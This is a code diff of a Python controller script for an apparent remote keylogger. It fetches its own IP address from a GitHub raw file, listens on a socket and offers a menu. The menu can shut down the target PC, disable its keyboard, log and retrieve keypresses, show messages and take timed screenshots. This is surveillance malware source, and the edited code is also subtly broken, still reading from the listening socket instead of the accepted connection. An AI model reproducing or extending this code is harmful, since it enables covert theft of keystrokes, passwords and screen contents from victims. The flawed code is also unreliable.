@@ -5,30 +5,32 @@ listen_port = 6969
 filename="keys.txt"
 ifilename="scrn"
 k=0
+a=0
 argt1=""
 bdata=b""
-    # Create a UDP socket
-addr=os.popen("curl https://raw.githubusercontent.com/txt-sys/txt/refs/heads/main/ip.txt").read()
-naddr=""
-for n in addr:
-        if n=='\n':
-            break
-        else:
-            naddr+=n
-print(naddr)
+addr2=""
+addr1=os.popen("curl https://raw.githubusercontent.com/txt-sys/txt/refs/heads/main/ip.txt").read()
+f=len(addr1) -1
+for n in addr1:
+    if a==f:
+        break
+    addr2+=n
+    a+=1
+s=socket.socket()
+s.bind((addr2, listen_port))
+s.listen()
 print("Input option\n1.Shutdown PC\n2.Switch off keyboard\n3.Keylog keypresses\n4.Retrieve txt file with presses\n5.Generate message on screen\n6.Screenshot(input time to take scrnsht and interval time)\nE:Close connection\n")
 while True:
+	c ,addr=s.accept()
 	argt1=""
 	option=""
 	k=0
-	s=socket.socket()
-	s.connect((naddr, listen_port))
 	print("Ready")
 	option=input()
 	while True:
-		c=option[0]
-		s.send(option.encode())
-		if c=='4':
+		o=option[0]
+		c.send(option.encode())
+		if o=='4':
 			file = open('keys.txt', 'wb')
 			line = s.recv(1024)
 			while(line):
@@ -38,7 +40,7 @@ while True:
 			file.close()
 			s.close()
 			break
-		elif c=='6':
+		elif o=='6':
 			for n in option:
 				if n==' ':
 					k+=1
